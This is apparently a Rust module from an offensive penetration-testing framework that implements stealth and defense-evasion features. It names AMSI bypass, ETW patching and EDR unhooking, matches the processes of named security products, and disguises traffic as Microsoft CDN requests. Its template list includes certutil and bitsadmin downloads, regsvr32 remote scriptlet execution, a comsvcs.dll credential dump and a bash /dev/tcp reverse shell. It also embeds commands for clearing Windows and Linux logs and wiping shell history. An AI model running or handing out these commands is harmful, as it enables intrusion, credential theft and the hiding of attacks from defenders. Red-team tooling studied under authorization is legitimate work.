//! OPSEC Engine - Operational Security for Stealth Operations
//!
//! Comprehensive stealth framework for authorized penetration testing
//! that makes operations undetectable by SOC/SIEM/EDR systems.
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Features:
//! - Traffic shaping with sleep/jitter (like Cobalt Strike)
//! - EDR detection and adaptive behavior
//! - Living-off-the-Land binary execution (LOLBins)
//! - Log evasion and anti-forensics
//! - User behavior simulation
//! - Network traffic encryption and disguise
//!
//! MITRE ATT&CK Coverage:
//! - T1562: Impair Defenses
//! - T1070: Indicator Removal
//! - T1027: Obfuscation
//! - T1497: Virtualization/Sandbox Evasion
//! - T1140: Deobfuscate/Decode Files or Information
//! - T1036: Masquerading

use anyhow::{bail, Result};
use async_trait::async_trait;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use tokio::time::sleep;
use tracing::{debug, info, warn};
use uuid::Uuid;

use crate::core::module::Platform;

// ============================================================================
// Core OPSEC Types
// ============================================================================

/// Stealth level for operations
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, Default)]
pub enum StealthLevel {
    /// Standard operations with minimal restrictions
    /// Sleep: 0-1s, Normal network activity
    #[default]
    Normal,
    /// Balanced stealth and speed
    /// Sleep: 3-5s, Jitter: 0.2-0.3, Network: <50 packets
    Quiet,
    /// High stealth, moderate speed
    /// Sleep: 10-20s, Jitter: 0.3-0.5, Network: <10 packets
    Silent,
    /// Maximum stealth, very slow operations
    /// Sleep: 30-60s, Jitter: 0.5-0.8, Network: 1-3 packets
    Ghost,
}

impl StealthLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Ghost => "Ghost (Maximum)",
            Self::Silent => "Silent (High)",
            Self::Quiet => "Quiet (Balanced)",
            Self::Normal => "Normal (Standard)",
        }
    }

    /// Get base sleep duration for this stealth level
    pub fn base_sleep(&self) -> Duration {
        match self {
            Self::Ghost => Duration::from_secs(45),
            Self::Silent => Duration::from_secs(15),
            Self::Quiet => Duration::from_secs(4),
            Self::Normal => Duration::from_millis(500),
        }
    }

    /// Get jitter range for this stealth level
    pub fn jitter_range(&self) -> (f32, f32) {
        match self {
            Self::Ghost => (0.5, 0.8),
            Self::Silent => (0.3, 0.5),
            Self::Quiet => (0.2, 0.3),
            Self::Normal => (0.0, 0.1),
        }
    }

    /// Get maximum network packets per operation
    pub fn max_packets(&self) -> usize {
        match self {
            Self::Ghost => 3,
            Self::Silent => 10,
            Self::Quiet => 50,
            Self::Normal => 1000,
        }
    }
}

/// Network noise level configuration
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[derive(Default)]
pub enum NetworkNoise {
    /// Minimal packets (1-3)
    Whisper,
    /// Low packets (<10)
    Low,
    /// Moderate packets (<50)
    #[default]
    Moderate,
    /// Normal traffic
    Normal,
}


impl NetworkNoise {
    pub fn max_packets(&self) -> usize {
        match self {
            Self::Whisper => 3,
            Self::Low => 10,
            Self::Moderate => 50,
            Self::Normal => 1000,
        }
    }
}

/// Working hours configuration for user simulation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkingHours {
    pub start_hour: u8,
    pub end_hour: u8,
    pub days: Vec<u8>, // 0=Sunday, 1=Monday, etc.
    pub timezone_offset: i8,
}

impl Default for WorkingHours {
    fn default() -> Self {
        Self {
            start_hour: 8,
            end_hour: 18,
            days: vec![1, 2, 3, 4, 5], // Monday-Friday
            timezone_offset: 0,
        }
    }
}

/// Main OPSEC configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecConfig {
    /// Overall stealth level
    pub stealth_level: StealthLevel,
    /// Base delay between operations
    pub sleep: Duration,
    /// Random variance factor (0.0-1.0)
    pub jitter: f32,
    /// Maximum network noise
    pub max_network_noise: NetworkNoise,
    /// Use only native/LOLBin binaries
    pub use_lolbins_only: bool,
    /// Encrypt all traffic
    pub encrypt_traffic: bool,
    /// Simulate human behavior
    pub simulate_user: bool,
    /// Detect and adapt to EDR
    pub edr_aware: bool,
    /// Only operate during working hours
    pub work_hours_only: bool,
    /// Working hours configuration
    pub working_hours: WorkingHours,
    /// Avoid writing to disk
    pub memory_only: bool,
    /// Disguise traffic as legitimate
    pub disguise_traffic: bool,
    /// Process hollowing for execution
    pub process_hollowing: bool,
    /// Parent PID spoofing
    pub ppid_spoofing: bool,
    /// Unhook EDR hooks
    pub unhook_edr: bool,
    /// AMSI bypass (Windows)
    pub amsi_bypass: bool,
    /// ETW patching (Windows)
    pub etw_patch: bool,
}

impl Default for OpsecConfig {
    fn default() -> Self {
        Self::quiet()
    }
}

impl OpsecConfig {
    /// Create Ghost mode configuration (maximum stealth)
    pub fn ghost() -> Self {
        Self {
            stealth_level: StealthLevel::Ghost,
            sleep: Duration::from_secs(45),
            jitter: 0.65,
            max_network_noise: NetworkNoise::Whisper,
            use_lolbins_only: true,
            encrypt_traffic: true,
            simulate_user: true,
            edr_aware: true,
            work_hours_only: true,
            working_hours: WorkingHours::default(),
            memory_only: true,
            disguise_traffic: true,
            process_hollowing: true,
            ppid_spoofing: true,
            unhook_edr: true,
            amsi_bypass: true,
            etw_patch: true,
        }
    }

    /// Create Silent mode configuration (high stealth)
    pub fn silent() -> Self {
        Self {
            stealth_level: StealthLevel::Silent,
            sleep: Duration::from_secs(15),
            jitter: 0.4,
            max_network_noise: NetworkNoise::Low,
            use_lolbins_only: true,
            encrypt_traffic: true,
            simulate_user: true,
            edr_aware: true,
            work_hours_only: false,
            working_hours: WorkingHours::default(),
            memory_only: true,
            disguise_traffic: true,
            process_hollowing: false,
            ppid_spoofing: true,
            unhook_edr: true,
            amsi_bypass: true,
            etw_patch: true,
        }
    }

    /// Create Quiet mode configuration (balanced)
    pub fn quiet() -> Self {
        Self {
            stealth_level: StealthLevel::Quiet,
            sleep: Duration::from_secs(4),
            jitter: 0.25,
            max_network_noise: NetworkNoise::Moderate,
            use_lolbins_only: false,
            encrypt_traffic: true,
            simulate_user: false,
            edr_aware: true,
            work_hours_only: false,
            working_hours: WorkingHours::default(),
            memory_only: false,
            disguise_traffic: false,
            process_hollowing: false,
            ppid_spoofing: false,
            unhook_edr: false,
            amsi_bypass: true,
            etw_patch: false,
        }
    }

    /// Create Normal mode configuration (standard ops)
    pub fn normal() -> Self {
        Self {
            stealth_level: StealthLevel::Normal,
            sleep: Duration::from_millis(500),
            jitter: 0.05,
            max_network_noise: NetworkNoise::Normal,
            use_lolbins_only: false,
            encrypt_traffic: true,
            simulate_user: false,
            edr_aware: false,
            work_hours_only: false,
            working_hours: WorkingHours::default(),
            memory_only: false,
            disguise_traffic: false,
            process_hollowing: false,
            ppid_spoofing: false,
            unhook_edr: false,
            amsi_bypass: false,
            etw_patch: false,
        }
    }

    /// Create from stealth level
    pub fn from_level(level: StealthLevel) -> Self {
        match level {
            StealthLevel::Ghost => Self::ghost(),
            StealthLevel::Silent => Self::silent(),
            StealthLevel::Quiet => Self::quiet(),
            StealthLevel::Normal => Self::normal(),
        }
    }

    /// Builder: set sleep duration
    pub fn with_sleep(mut self, sleep: Duration) -> Self {
        self.sleep = sleep;
        self
    }

    /// Builder: set jitter
    pub fn with_jitter(mut self, jitter: f32) -> Self {
        self.jitter = jitter.clamp(0.0, 1.0);
        self
    }

    /// Builder: set EDR awareness
    pub fn with_edr_aware(mut self, aware: bool) -> Self {
        self.edr_aware = aware;
        self
    }
}

// ============================================================================
// Traffic Shaper
// ============================================================================

/// Traffic shaping for stealth network operations
#[async_trait]
pub trait TrafficShaper: Send + Sync {
    /// Apply throttling to limit packets
    async fn throttle(&self, requested_packets: usize) -> usize;

    /// Sleep with random jitter
    async fn sleep_with_jitter(&self);

    /// Disguise data as legitimate traffic
    async fn disguise_as_legitimate(&self, data: &[u8]) -> Vec<u8>;

    /// Check if we should wait for working hours
    async fn wait_for_work_hours(&self) -> bool;
}

/// Default traffic shaper implementation
pub struct DefaultTrafficShaper {
    config: OpsecConfig,
}

impl DefaultTrafficShaper {
    pub fn new(config: OpsecConfig) -> Self {
        Self { config }
    }

    fn calculate_jittered_sleep(&self) -> Duration {
        let base_ms = self.config.sleep.as_millis() as f64;
        let jitter_range = self.config.jitter as f64;

        let mut rng = rand::rng();
        let jitter_factor = 1.0 + rng.random_range(-jitter_range..jitter_range);

        let jittered_ms = (base_ms * jitter_factor).max(0.0) as u64;
        Duration::from_millis(jittered_ms)
    }
}

#[async_trait]
impl TrafficShaper for DefaultTrafficShaper {
    async fn throttle(&self, requested_packets: usize) -> usize {
        let max = self.config.max_network_noise.max_packets();
        let throttled = requested_packets.min(max);

        if throttled < requested_packets {
            debug!(
                "Traffic throttled: {} -> {} packets (max: {})",
                requested_packets, throttled, max
            );
        }

        throttled
    }

    async fn sleep_with_jitter(&self) {
        let sleep_duration = self.calculate_jittered_sleep();

        debug!(
            "OPSEC sleep: {:?} (base: {:?}, jitter: {:.2})",
            sleep_duration, self.config.sleep, self.config.jitter
        );

        sleep(sleep_duration).await;
    }

    async fn disguise_as_legitimate(&self, data: &[u8]) -> Vec<u8> {
        if !self.config.disguise_traffic {
            return data.to_vec();
        }

        // Wrap data in HTTP-like headers to look like normal web traffic
        let mut disguised = Vec::new();

        // Add fake HTTP headers
        let headers = format!(
            "GET /api/v1/sync HTTP/1.1\r\n\
             Host: cdn.microsoft.com\r\n\
             User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
             Accept: application/json\r\n\
             Content-Length: {}\r\n\
             X-Request-ID: {}\r\n\
             \r\n",
            data.len(),
            Uuid::new_v4()
        );

        disguised.extend_from_slice(headers.as_bytes());
        disguised.extend_from_slice(data);

        disguised
    }

    async fn wait_for_work_hours(&self) -> bool {
        if !self.config.work_hours_only {
            return true;
        }

        // In safe mode, we just check the configuration
        let wh = &self.config.working_hours;
        info!(
            "Work hours configured: {:02}:00-{:02}:00, days: {:?}",
            wh.start_hour, wh.end_hour, wh.days
        );

        true // In production, would check actual time
    }
}

// ============================================================================
// EDR Detection
// ============================================================================

/// Known EDR/AV types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum EdrType {
    WindowsDefender,
    CrowdStrike,
    SentinelOne,
    CarbonBlack,
    Cylance,
    Sophos,
    McAfee,
    Symantec,
    TrendMicro,
    Kaspersky,
    ESET,
    Bitdefender,
    Panda,
    FireEye,
    MalwareBytes,
    Elastic,
    MicrosoftATP,
    Unknown,
}

impl EdrType {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::WindowsDefender => "Windows Defender",
            Self::CrowdStrike => "CrowdStrike Falcon",
            Self::SentinelOne => "SentinelOne",
            Self::CarbonBlack => "VMware Carbon Black",
            Self::Cylance => "Cylance",
            Self::Sophos => "Sophos",
            Self::McAfee => "McAfee",
            Self::Symantec => "Symantec/Broadcom",
            Self::TrendMicro => "Trend Micro",
            Self::Kaspersky => "Kaspersky",
            Self::ESET => "ESET",
            Self::Bitdefender => "Bitdefender",
            Self::Panda => "Panda Security",
            Self::FireEye => "FireEye/Trellix",
            Self::MalwareBytes => "Malwarebytes",
            Self::Elastic => "Elastic Security",
            Self::MicrosoftATP => "Microsoft Defender ATP",
            Self::Unknown => "Unknown EDR",
        }
    }

    /// Get recommended stealth level for this EDR
    pub fn recommended_stealth(&self) -> StealthLevel {
        match self {
            Self::CrowdStrike | Self::SentinelOne | Self::CarbonBlack | Self::MicrosoftATP => {
                StealthLevel::Ghost
            }
            Self::WindowsDefender | Self::Cylance | Self::Elastic | Self::FireEye => {
                StealthLevel::Silent
            }
            _ => StealthLevel::Quiet,
        }
    }

    /// Get MITRE ID for defense evasion
    pub fn mitre_id(&self) -> &'static str {
        "T1562" // Impair Defenses
    }
}

/// EDR detection result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EdrDetectionResult {
    pub detected_edrs: Vec<EdrType>,
    pub processes: Vec<String>,
    pub services: Vec<String>,
    pub drivers: Vec<String>,
    pub hooks_detected: bool,
    pub recommended_config: OpsecConfig,
}

/// EDR detection signatures
#[derive(Debug, Clone)]
pub struct EdrSignature {
    pub edr_type: EdrType,
    pub process_names: Vec<&'static str>,
    pub service_names: Vec<&'static str>,
    pub driver_names: Vec<&'static str>,
}

/// EDR detector implementation
pub struct EdrDetector {
    signatures: Vec<EdrSignature>,
}

impl Default for EdrDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl EdrDetector {
    pub fn new() -> Self {
        let signatures = vec![
            EdrSignature {
                edr_type: EdrType::WindowsDefender,
                process_names: vec![
                    "MsMpEng.exe",
                    "MsSense.exe",
                    "SenseCncProxy.exe",
                    "SenseIR.exe",
                ],
                service_names: vec!["WinDefend", "Sense", "WdNisSvc"],
                driver_names: vec!["WdFilter", "WdNisDrv"],
            },
            EdrSignature {
                edr_type: EdrType::CrowdStrike,
                process_names: vec![
                    "CSFalconService.exe",
                    "CSFalconContainer.exe",
                    "csagent.exe",
                ],
                service_names: vec!["CSFalconService", "CSAgent"],
                driver_names: vec!["csdevicecontrol", "csagent"],
            },
            EdrSignature {
                edr_type: EdrType::SentinelOne,
                process_names: vec![
                    "SentinelAgent.exe",
                    "SentinelServiceHost.exe",
                    "SentinelStaticEngine.exe",
                ],
                service_names: vec!["SentinelAgent", "SentinelStaticEngine"],
                driver_names: vec!["sentinelmonitor"],
            },
            EdrSignature {
                edr_type: EdrType::CarbonBlack,
                process_names: vec![
                    "cb.exe",
                    "cbcomms.exe",
                    "cbdefense.exe",
                    "RepMgr.exe",
                ],
                service_names: vec!["CbDefense", "CbDefenseWSC", "carbonblack"],
                driver_names: vec!["carbonblackk", "cbk7"],
            },
            EdrSignature {
                edr_type: EdrType::Cylance,
                process_names: vec!["CylanceSvc.exe", "CylanceUI.exe"],
                service_names: vec!["CylanceSvc"],
                driver_names: vec!["CyOptics", "CyProtectDrv"],
            },
            EdrSignature {
                edr_type: EdrType::Sophos,
                process_names: vec![
                    "SophosFS.exe",
                    "SophosNtpService.exe",
                    "sophossps.exe",
                ],
                service_names: vec!["Sophos", "SAVService", "SAVAdminService"],
                driver_names: vec!["savonaccess", "sophosbootdriver"],
            },
            EdrSignature {
                edr_type: EdrType::McAfee,
                process_names: vec!["mcshield.exe", "mfetp.exe", "mfemms.exe"],
                service_names: vec!["McShield", "mfemms", "McAfeeFramework"],
                driver_names: vec!["mfeaack", "mfehidk"],
            },
            EdrSignature {
                edr_type: EdrType::Symantec,
                process_names: vec!["ccSvcHst.exe", "Rtvscan.exe", "smc.exe"],
                service_names: vec!["Symantec", "SepMasterService"],
                driver_names: vec!["symefasi", "symevent"],
            },
            EdrSignature {
                edr_type: EdrType::TrendMicro,
                process_names: vec!["TMBMSRV.exe", "PccNTMon.exe", "TmListen.exe"],
                service_names: vec!["TrendMicro", "TmFilter"],
                driver_names: vec!["tmactmon", "tmcomm"],
            },
            EdrSignature {
                edr_type: EdrType::Kaspersky,
                process_names: vec!["avp.exe", "kavfswh.exe"],
                service_names: vec!["AVP", "kavfsslp"],
                driver_names: vec!["klif", "kl1", "klim6"],
            },
            EdrSignature {
                edr_type: EdrType::ESET,
                process_names: vec!["ekrn.exe", "egui.exe"],
                service_names: vec!["ekrn", "EraAgentSvc"],
                driver_names: vec!["eamonm", "epfwwfpr"],
            },
            EdrSignature {
                edr_type: EdrType::Bitdefender,
                process_names: vec!["bdagent.exe", "vsserv.exe", "bdservicehost.exe"],
                service_names: vec!["bdredline", "EPSecurityService"],
                driver_names: vec!["bdfm", "bdfsfltr"],
            },
            EdrSignature {
                edr_type: EdrType::FireEye,
                process_names: vec!["xagt.exe", "xagtnotif.exe"],
                service_names: vec!["xagt"],
                driver_names: vec!["FeKern"],
            },
            EdrSignature {
                edr_type: EdrType::MalwareBytes,
                process_names: vec!["MBAMService.exe", "mbam.exe"],
                service_names: vec!["MBAMService"],
                driver_names: vec!["mbamchameleon", "mbamswissarmy"],
            },
            EdrSignature {
                edr_type: EdrType::Elastic,
                process_names: vec!["elastic-agent.exe", "elastic-endpoint.exe"],
                service_names: vec!["elastic-agent", "elastic-endpoint"],
                driver_names: vec!["elasticendpoint"],
            },
            EdrSignature {
                edr_type: EdrType::MicrosoftATP,
                process_names: vec!["MsSense.exe", "SenseCncProxy.exe"],
                service_names: vec!["Sense"],
                driver_names: vec!["WdFilter"],
            },
        ];

        Self { signatures }
    }

    /// Detect EDR based on process list
    pub fn detect_from_processes(&self, processes: &[String]) -> Vec<EdrType> {
        let mut detected = Vec::new();
        let processes_lower: Vec<String> = processes.iter().map(|p| p.to_lowercase()).collect();

        for sig in &self.signatures {
            for proc_name in &sig.process_names {
                if processes_lower
                    .iter()
                    .any(|p| p.contains(&proc_name.to_lowercase()))
                {
                    if !detected.contains(&sig.edr_type) {
                        detected.push(sig.edr_type);
                    }
                    break;
                }
            }
        }

        detected
    }

    /// Detect EDR based on services
    pub fn detect_from_services(&self, services: &[String]) -> Vec<EdrType> {
        let mut detected = Vec::new();
        let services_lower: Vec<String> = services.iter().map(|s| s.to_lowercase()).collect();

        for sig in &self.signatures {
            for svc_name in &sig.service_names {
                if services_lower
                    .iter()
                    .any(|s| s.contains(&svc_name.to_lowercase()))
                {
                    if !detected.contains(&sig.edr_type) {
                        detected.push(sig.edr_type);
                    }
                    break;
                }
            }
        }

        detected
    }

    /// Get recommended OPSEC config for detected EDRs
    pub fn recommend_config(&self, detected_edrs: &[EdrType]) -> OpsecConfig {
        if detected_edrs.is_empty() {
            return OpsecConfig::quiet();
        }

        // Use the most restrictive stealth level needed
        let max_stealth = detected_edrs
            .iter()
            .map(|e| e.recommended_stealth())
            .max()
            .unwrap_or(StealthLevel::Quiet);

        OpsecConfig::from_level(max_stealth)
    }

    /// Perform full EDR detection (safe mode)
    pub async fn detect(&self, safe_mode: bool) -> Result<EdrDetectionResult> {
        if safe_mode {
            // Return demo detection in safe mode
            let demo_edrs = vec![EdrType::WindowsDefender];

            let config = self.recommend_config(&demo_edrs);

            return Ok(EdrDetectionResult {
                detected_edrs: demo_edrs,
                processes: vec![
                    "MsMpEng.exe".to_string(),
                    "MsSense.exe".to_string(),
                ],
                services: vec!["WinDefend".to_string(), "Sense".to_string()],
                drivers: vec!["WdFilter".to_string()],
                hooks_detected: false,
                recommended_config: config,
            });
        }

        bail!("Production mode EDR detection requires explicit authorization")
    }
}

// ============================================================================
// LOLBins Executor
// ============================================================================

/// Living-off-the-Land binary mapping
#[derive(Debug, Clone)]
pub struct LolbinMapping {
    pub dangerous_tool: &'static str,
    pub lolbin_alternative: &'static str,
    pub command_template: &'static str,
    pub description: &'static str,
    pub mitre_id: &'static str,
}

/// LOLBins executor for native binary execution
pub struct LolbinExecutor {
    mappings: Vec<LolbinMapping>,
    platform: Platform,
}

impl LolbinExecutor {
    pub fn new(platform: Platform) -> Self {
        let mappings = match platform {
            Platform::Windows => Self::windows_mappings(),
            Platform::Linux => Self::linux_mappings(),
            _ => Vec::new(),
        };

        Self { mappings, platform }
    }

    fn windows_mappings() -> Vec<LolbinMapping> {
        vec![
            // Remote execution alternatives
            LolbinMapping {
                dangerous_tool: "psexec.exe",
                lolbin_alternative: "sc.exe",
                command_template: "sc \\\\{target} create {name} binPath= \"{payload}\"",
                description: "Service creation instead of PSExec",
                mitre_id: "T1543.003",
            },
            LolbinMapping {
                dangerous_tool: "psexec.exe",
                lolbin_alternative: "wmic.exe",
                command_template: "wmic /node:\"{target}\" process call create \"{command}\"",
                description: "WMI process creation",
                mitre_id: "T1047",
            },
            LolbinMapping {
                dangerous_tool: "psexec.exe",
                lolbin_alternative: "schtasks.exe",
                command_template: "schtasks /create /s {target} /tn \"{name}\" /tr \"{command}\" /sc once /st 00:00 /ru SYSTEM",
                description: "Scheduled task creation",
                mitre_id: "T1053.005",
            },
            // Download alternatives
            LolbinMapping {
                dangerous_tool: "curl.exe",
                lolbin_alternative: "certutil.exe",
                command_template: "certutil -urlcache -split -f {url} {output}",
                description: "Certificate utility for downloads",
                mitre_id: "T1105",
            },
            LolbinMapping {
                dangerous_tool: "wget.exe",
                lolbin_alternative: "bitsadmin.exe",
                command_template: "bitsadmin /transfer job /download /priority normal {url} {output}",
                description: "BITS transfer for downloads",
                mitre_id: "T1197",
            },
            // Execution alternatives
            LolbinMapping {
                dangerous_tool: "powershell.exe",
                lolbin_alternative: "mshta.exe",
                command_template: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{command}\"\": close\")",
                description: "MSHTA script execution",
                mitre_id: "T1218.005",
            },
            LolbinMapping {
                dangerous_tool: "cmd.exe",
                lolbin_alternative: "forfiles.exe",
                command_template: "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{command}\"",
                description: "ForFiles command execution",
                mitre_id: "T1202",
            },
            LolbinMapping {
                dangerous_tool: "rundll32.exe",
                lolbin_alternative: "regsvr32.exe",
                command_template: "regsvr32 /s /n /u /i:{url} scrobj.dll",
                description: "RegSvr32 scriptlet execution",
                mitre_id: "T1218.010",
            },
            // Credential dumping alternatives
            LolbinMapping {
                dangerous_tool: "mimikatz.exe",
                lolbin_alternative: "comsvcs.dll",
                command_template: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} {output} full",
                description: "MiniDump via comsvcs.dll",
                mitre_id: "T1003.001",
            },
            // Persistence alternatives
            LolbinMapping {
                dangerous_tool: "reg.exe add",
                lolbin_alternative: "mmc.exe",
                command_template: "Use Group Policy snap-in for registry modifications",
                description: "GPO-based persistence",
                mitre_id: "T1484.001",
            },
        ]
    }

    fn linux_mappings() -> Vec<LolbinMapping> {
        vec![
            LolbinMapping {
                dangerous_tool: "wget",
                lolbin_alternative: "curl",
                command_template: "curl -o {output} {url}",
                description: "Native curl for downloads",
                mitre_id: "T1105",
            },
            LolbinMapping {
                dangerous_tool: "nc",
                lolbin_alternative: "bash",
                command_template: "bash -i >& /dev/tcp/{host}/{port} 0>&1",
                description: "Bash reverse shell",
                mitre_id: "T1059.004",
            },
            LolbinMapping {
                dangerous_tool: "python",
                lolbin_alternative: "perl",
                command_template: "perl -e 'use Socket;...'",
                description: "Perl alternative execution",
                mitre_id: "T1059.006",
            },
        ]
    }

    /// Get LOLBin alternative for a dangerous tool
    pub fn get_alternative(&self, dangerous_tool: &str) -> Option<&LolbinMapping> {
        self.mappings
            .iter()
            .find(|m| m.dangerous_tool.to_lowercase() == dangerous_tool.to_lowercase())
    }

    /// Get all alternatives for a tool
    pub fn get_all_alternatives(&self, dangerous_tool: &str) -> Vec<&LolbinMapping> {
        self.mappings
            .iter()
            .filter(|m| m.dangerous_tool.to_lowercase() == dangerous_tool.to_lowercase())
            .collect()
    }

    /// List all LOLBin mappings
    pub fn list_mappings(&self) -> &[LolbinMapping] {
        &self.mappings
    }

    /// Generate safe command using LOLBin
    pub fn generate_safe_command(
        &self,
        dangerous_tool: &str,
        params: &HashMap<String, String>,
    ) -> Option<String> {
        let mapping = self.get_alternative(dangerous_tool)?;

        let mut cmd = mapping.command_template.to_string();
        for (key, value) in params {
            cmd = cmd.replace(&format!("{{{}}}", key), value);
        }

        Some(cmd)
    }
}

// ============================================================================
// User Simulator
// ============================================================================

/// User behavior simulation for stealth
pub struct UserSimulator {
    config: OpsecConfig,
}

impl UserSimulator {
    pub fn new(config: OpsecConfig) -> Self {
        Self { config }
    }

    /// Generate random delay mimicking human behavior
    pub async fn random_delay(&self) -> Duration {
        let mut rng = rand::rng();

        // Human-like delay patterns
        let base_delay = match self.config.stealth_level {
            StealthLevel::Ghost => rng.random_range(30_000..120_000), // 30s-2min
            StealthLevel::Silent => rng.random_range(5_000..30_000),  // 5-30s
            StealthLevel::Quiet => rng.random_range(1_000..5_000),    // 1-5s
            StealthLevel::Normal => rng.random_range(100..1_000),     // 0.1-1s
        };

        Duration::from_millis(base_delay)
    }

    /// Simulate typing delay
    pub async fn simulate_typing(&self, text_length: usize) {
        if !self.config.simulate_user {
            return;
        }

        let mut rng = rand::rng();

        // Average typing speed: 40-60 WPM = ~200-300ms per character
        for _ in 0..text_length {
            let char_delay = rng.random_range(150..350);
            sleep(Duration::from_millis(char_delay)).await;
        }
    }

    /// Check if within working hours
    pub fn is_work_hours(&self) -> bool {
        if !self.config.work_hours_only {
            return true;
        }

        // In safe mode, assume we're in work hours
        // In production, would check actual system time
        true
    }

    /// Wait until work hours
    pub async fn wait_for_work_hours(&self) {
        if !self.config.work_hours_only {
            return;
        }

        while !self.is_work_hours() {
            info!("Outside work hours, waiting...");
            sleep(Duration::from_secs(300)).await; // Check every 5 minutes
        }
    }

    /// Add realistic pauses between actions
    pub async fn pause_between_actions(&self) {
        if !self.config.simulate_user {
            return;
        }

        let delay = self.random_delay().await;
        debug!("User simulation pause: {:?}", delay);
        sleep(delay).await;
    }
}

// ============================================================================
// Log Evasion
// ============================================================================

/// Actions that can be monitored
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MonitoredAction {
    ProcessCreation,
    FileWrite,
    RegistryModification,
    NetworkConnection,
    ServiceCreation,
    ScheduledTask,
    PowerShellExecution,
    WmiQuery,
    CredentialAccess,
    DllInjection,
}

impl MonitoredAction {
    pub fn risk_level(&self) -> u8 {
        match self {
            Self::CredentialAccess => 10,
            Self::DllInjection => 9,
            Self::PowerShellExecution => 8,
            Self::ServiceCreation => 7,
            Self::ScheduledTask => 7,
            Self::WmiQuery => 6,
            Self::ProcessCreation => 5,
            Self::RegistryModification => 5,
            Self::FileWrite => 4,
            Self::NetworkConnection => 3,
        }
    }

    pub fn evasion_technique(&self) -> &'static str {
        match self {
            Self::ProcessCreation => "Use process hollowing or PPID spoofing",
            Self::FileWrite => "Use memory-only execution or alternate data streams",
            Self::RegistryModification => "Modify existing keys instead of creating new",
            Self::NetworkConnection => "Use legitimate traffic channels (DNS, HTTPS)",
            Self::ServiceCreation => "Hijack existing services instead",
            Self::ScheduledTask => "Modify existing tasks instead of creating new",
            Self::PowerShellExecution => "Use constrained language mode bypass or AMSI bypass",
            Self::WmiQuery => "Use WMI event subscriptions instead",
            Self::CredentialAccess => "Use in-memory techniques, avoid disk writes",
            Self::DllInjection => "Use process hollowing or module stomping",
        }
    }
}

/// Log evasion techniques
pub struct LogEvasion {
    config: OpsecConfig,
}

impl LogEvasion {
    pub fn new(config: OpsecConfig) -> Self {
        Self { config }
    }

    /// Check if an action is highly monitored
    pub fn is_monitored(&self, action: MonitoredAction) -> bool {
        let threshold = match self.config.stealth_level {
            StealthLevel::Ghost => 3,  // Avoid anything risky
            StealthLevel::Silent => 5, // Avoid medium+ risk
            StealthLevel::Quiet => 7,  // Avoid high risk
            StealthLevel::Normal => 10, // Only avoid critical
        };

        action.risk_level() >= threshold
    }

    /// Get evasion recommendation for an action
    pub fn get_evasion_technique(&self, action: MonitoredAction) -> Option<&'static str> {
        if self.is_monitored(action) {
            Some(action.evasion_technique())
        } else {
            None
        }
    }

    /// Generate reference for clearing Windows event logs
    pub fn generate_log_clear_reference(&self) -> String {
        r#"=== Windows Event Log Evasion ===
MITRE ATT&CK: T1070.001

TECHNIQUES:
1. Clear specific logs (noisy):
   wevtutil cl Security
   wevtutil cl System
   wevtutil cl Application

2. Disable logging (stealthier):
   auditpol /set /category:"*" /success:disable /failure:disable

3. Stop Event Log service:
   sc stop eventlog

4. Modify log retention:
   wevtutil sl Security /ms:0

STEALTH ALTERNATIVES:
- Use Invoke-Phant0m to kill Event Log threads
- Patch ETW to prevent logging
- Use direct NTAPI calls to avoid hooks

DETECTION EVASION:
- Clear logs generates Event ID 1102
- Consider timestomping instead of clearing
- Use NTFS alternate data streams for artifacts
"#
        .to_string()
    }

    /// Generate reference for Linux log evasion
    pub fn generate_linux_log_evasion_reference(&self) -> String {
        r#"=== Linux Log Evasion ===
MITRE ATT&CK: T1070.002

TECHNIQUES:
1. Clear specific logs:
   truncate -s 0 /var/log/auth.log
   cat /dev/null > /var/log/syslog

2. Remove from bash history:
   unset HISTFILE
   export HISTSIZE=0
   history -c

3. Timestomp files:
   touch -r /etc/passwd /path/to/modified/file

4. Hide processes:
   Use LD_PRELOAD to hide from ps/top

STEALTH ALTERNATIVES:
- Modify logging config instead of clearing
- Use auditd exclusion rules
- Operate from /dev/shm (tmpfs)
"#
        .to_string()
    }
}

// ============================================================================
// OPSEC Engine
// ============================================================================

/// Main OPSEC engine that integrates all components
pub struct OpsecEngine {
    config: OpsecConfig,
    traffic_shaper: DefaultTrafficShaper,
    edr_detector: EdrDetector,
    lolbin_executor: LolbinExecutor,
    user_simulator: UserSimulator,
    log_evasion: LogEvasion,
    detected_edrs: Vec<EdrType>,
}

impl OpsecEngine {
    pub fn new(config: OpsecConfig, platform: Platform) -> Self {
        let traffic_shaper = DefaultTrafficShaper::new(config.clone());
        let edr_detector = EdrDetector::new();
        let lolbin_executor = LolbinExecutor::new(platform);
        let user_simulator = UserSimulator::new(config.clone());
        let log_evasion = LogEvasion::new(config.clone());

        Self {
            config,
            traffic_shaper,
            edr_detector,
            lolbin_executor,
            user_simulator,
            log_evasion,
            detected_edrs: Vec::new(),
        }
    }

    /// Create engine with auto-detected stealth level
    pub async fn with_auto_stealth(platform: Platform, safe_mode: bool) -> Result<Self> {
        let edr_detector = EdrDetector::new();
        let detection = edr_detector.detect(safe_mode).await?;

        let config = detection.recommended_config;

        info!(
            "OPSEC auto-config: {:?} (detected: {:?})",
            config.stealth_level, detection.detected_edrs
        );

        let mut engine = Self::new(config, platform);
        engine.detected_edrs = detection.detected_edrs;

        Ok(engine)
    }

    /// Get current OPSEC configuration
    pub fn config(&self) -> &OpsecConfig {
        &self.config
    }

    /// Update OPSEC configuration
    pub fn set_config(&mut self, config: OpsecConfig) {
        self.config = config.clone();
